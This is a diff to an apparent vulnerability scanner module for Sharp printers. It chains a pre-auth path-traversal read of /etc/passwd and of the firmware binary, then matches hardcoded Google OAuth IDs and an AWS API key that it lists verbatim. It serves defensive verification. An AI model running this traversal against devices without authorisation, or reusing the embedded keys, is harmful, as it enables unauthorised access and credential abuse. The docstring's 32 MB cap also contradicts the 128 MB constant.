@@ -126,6 +126,30 @@ _LFI_PASSWD_RE = re.compile(r"^root:[^:\n]*:0:0:", re.M)
 #   https://global.sharp/products/copier/info/info_security_2024-05.html
 # Referenced by every advisory finding below as the remediation pointer.
 SHARP_ADVISORY = "Sharp advisory JVN#VU93051062 (2024-05-31)"
+
+# The main binary path the LFI is chained to. When the /etc/passwd probe
+# succeeds we know the traversal works, so we grab /tmp/main/main and grep
+# for the exact hardcoded secrets Pierre Kim called out in the June 2024
+# advisory. Only a byte-for-byte match on this device is treated as proof.
+# The MX-M6071 binary is ~82 MB and the hardcoded strings live at
+# offsets 43M and 81M, so the ceiling has to be well above 80 MB or the
+# strings sit past truncation and every device reads as a false negative.
+MAIN_BINARY_PATH_ARG = "/manual/../../../tmp/main/main"
+MAIN_BINARY_MAX_BYTES = 128 * 1024 * 1024
+
+# Verbatim strings from the advisory. Byte-strings so we can search the
+# binary payload without decoding.
+GOOGLE_CLIENT_IDS = (
+    b"265490466885-m5cjvglv9q8aak493cgepe7juvafgh8c.apps.googleusercontent.com",
+    b"347970444986-0pij6u2tfhb240edjmls3h1u8qm2v2b3.apps.googleusercontent.com",
+    b"410988772526-6ujegl6jvquh9kstiegva8fk5j2ogag9.apps.googleusercontent.com",
+    b"292646726735-033ggn9hmlrs8bntrj0fbstob9m8qt26.apps.googleusercontent.com",
+)
+AWS_API_KEY = b"PBYXSIK6av8fBt8Qe1EQUaF9ZaKvTDutaXS9YwWA"
+AWS_POSTMAN_TOKEN = b"44688039-5104-39be-f974-c1f5ef621a5f"
+AWS_ANALYTICS_ENDPOINT = (
+    b"7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics"
+)
 _TABLE_RE = re.compile(r"<table[^>]*>(.*?)</table>", re.S | re.I)
 _ROW_RE = re.compile(r"<tr[^>]*>(.*?)</tr>", re.S | re.I)
 _CELL_RE = re.compile(r"<t([dh])[^>]*>(.*?)</t\1>", re.S | re.I)
@@ -909,34 +933,141 @@ class SharpModule(PrinterModule):
 
     # ---- vulnerability checks -----------------------------------------
     def check_vulnerabilities(self, target: Target, ctx: ScanContext,
-                              login_result: Optional[LoginResult] = None) -> List[VulnFinding]:
+                              login_result: Optional[LoginResult] = None,
+                              include_advisories: bool = False) -> List[VulnFinding]:
         """
         Findings from Pierre Kim's June 2024 Sharp MFP advisory bundle.
 
-        One active probe (the pre-auth LFI, safe because it is a read of a
-        harmless system file) plus five advisory findings that this module
-        deliberately does not exploit. See ``_advisory_pre_auth_memory_corruption``
-        and friends for the reasoning behind not actively testing each.
+        Default output is zero-false-positive. Two verified checks run:
+
+          * The pre-auth LFI probe reads /etc/passwd through
+            /installed_emanual_down.html. A byte-level match on ``root:*:0:0:``
+            is the proof.
+          * When the LFI probe succeeds, the same primitive fetches
+            /tmp/main/main and greps for the exact hardcoded Google OAuth
+            client IDs and AWS analytics key strings the advisory calls out.
+            A byte-for-byte match on this specific device's binary is the
+            proof; misses do not produce a finding.
+
+        Three CVEs cannot be actively verified without an exploit that
+        would crash, reboot, reconfigure, or otherwise touch the printer's
+        live state (CVE-2024-28038 memory corruption, CVE-2022-45796 IPv6
+        command injection, CVE-2024-34162 LDAP downgrade). They are
+        suppressed by default and re-enabled with ``include_advisories=True``
+        for internal triage.
         """
         findings: List[VulnFinding] = []
 
         try:
-            confirmed = self._check_pre_auth_lfi(target, ctx)
+            confirmed_lfi = self._check_pre_auth_lfi(target, ctx)
         except Exception:
-            confirmed = None
-        if confirmed:
-            findings.append(confirmed)
+            confirmed_lfi = None
+        if confirmed_lfi:
+            findings.append(confirmed_lfi)
+            # Chain: the same LFI reads /tmp/main/main. Grep for the exact
+            # hardcoded secrets and emit a verified finding per hit.
+            try:
+                findings.extend(self._verify_hardcoded_secrets(target, ctx))
+            except Exception:
+                pass
 
-        admin_default_worked = bool(
-            login_result and login_result.ok
-            and login_result.account.username.lower() == "administrator"
-        )
+        if include_advisories:
+            admin_default_worked = bool(
+                login_result and login_result.ok
+                and login_result.account.username.lower() == "administrator"
+            )
+            # If the binary chain already produced verified rows for the
+            # Google or AWS secrets, don't shadow them with an advisory row.
+            verified_cves = {f.cve for f in findings}
+            findings.append(self._advisory_pre_auth_memory_corruption())
+            if "CVE-2024-36248" not in verified_cves:
+                findings.append(self._advisory_hardcoded_google_keys())
+            if "no-CVE (hardcoded AWS analytics key)" not in verified_cves:
+                findings.append(self._advisory_hardcoded_aws_keys())
+            findings.append(self._advisory_ipv6_command_injection(admin_default_worked))
+            findings.append(self._advisory_ldap_downgrade(admin_default_worked))
 
-        findings.append(self._advisory_pre_auth_memory_corruption())
-        findings.append(self._advisory_hardcoded_google_keys())
-        findings.append(self._advisory_hardcoded_aws_keys())
-        findings.append(self._advisory_ipv6_command_injection(admin_default_worked))
-        findings.append(self._advisory_ldap_downgrade(admin_default_worked))
+        return findings
+
+    def _verify_hardcoded_secrets(self, target: Target,
+                                  ctx: ScanContext) -> List[VulnFinding]:
+        """
+        Chain the pre-auth LFI to a byte-for-byte proof of the hardcoded
+        Google OAuth client IDs and AWS analytics key. Only runs after the
+        /etc/passwd probe has already confirmed traversal works.
+
+        The read is capped at 32 MB and streamed. If the response is not a
+        real binary (device patched the endpoint, or the file was renamed
+        between firmware versions), no finding is emitted - a miss on this
+        chain must never masquerade as a hit.
+        """
+        url = f"{target.base_url}{LFI_PATH}?path={MAIN_BINARY_PATH_ARG}"
+        headers = {
+            "User-Agent": BROWSER_UA,
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "close",
+        }
+        log_request(ctx, "SHARP LFI BINARY CHAIN", target.hostport, "GET", url, headers)
+        try:
+            resp = http_get(url, ctx, headers=headers, allow_redirects=False,
+                            max_bytes=MAIN_BINARY_MAX_BYTES,
+                            timeout=ctx.export_timeout)
+        except RequestException:
+            return []
+        log_response(ctx, "SHARP LFI BINARY CHAIN RESPONSE",
+                     target.hostport, resp, body_limit=120)
+
+        if resp.status_code != 200:
+            return []
+        body = resp.content or b""
+        # ELF magic is the cheapest sanity check that we actually pulled a
+        # binary and not a 200-OK error page that happens to be small.
+        if not body.startswith(b"\x7fELF") and len(body) < 4096:
+            return []
+
+        findings: List[VulnFinding] = []
+        google_hits = [cid.decode() for cid in GOOGLE_CLIENT_IDS if cid in body]
+        aws_hits: List[str] = []
+        for marker in (AWS_API_KEY, AWS_POSTMAN_TOKEN, AWS_ANALYTICS_ENDPOINT):
+            if marker in body:
+                aws_hits.append(marker.decode())
+
+        if google_hits:
+            findings.append(VulnFinding(
+                cve="CVE-2024-36248",
+                title="Hardcoded Google OAuth client IDs in the main firmware binary",
+                severity="medium",
+                verified=True,
+                output=(
+                    "Verified on this device: fetched /tmp/main/main through the "
+                    "pre-auth LFI and matched the following Google OAuth client "
+                    f"ID(s) verbatim in the binary: {'; '.join(google_hits)}. "
+                    "The reporter notes these registrations are no longer used by "
+                    "Sharp and are free for anyone to claim, so any device attempt "
+                    "to reach them is receivable by an attacker who registers "
+                    f"them. Apply the firmware update per {SHARP_ADVISORY} and "
+                    "block outbound traffic to the listed hosts."
+                ),
+            ))
+        if aws_hits:
+            findings.append(VulnFinding(
+                cve="no-CVE (hardcoded AWS analytics key)",
+                title="Hardcoded AWS API key and analytics endpoint in the main firmware binary",
+                severity="medium",
+                verified=True,
+                output=(
+                    "Verified on this device: fetched /tmp/main/main through the "
+                    "pre-auth LFI and matched the following hardcoded value(s) "
+                    f"verbatim in the binary: {'; '.join(aws_hits)}. The binary "
+                    "uses these to POST device analytics with 'curl -k' (TLS "
+                    "certificate validation disabled). Any actor who recovers the "
+                    "keys can impersonate a printer or, by MITM'ing the analytics "
+                    "endpoint, receive traffic from every device. Apply the "
+                    f"firmware update per {SHARP_ADVISORY} and block outbound "
+                    "traffic to the listed endpoint."
+                ),
+            ))
         return findings
 
     def _check_pre_auth_lfi(self, target: Target, ctx: ScanContext) -> Optional[VulnFinding]:
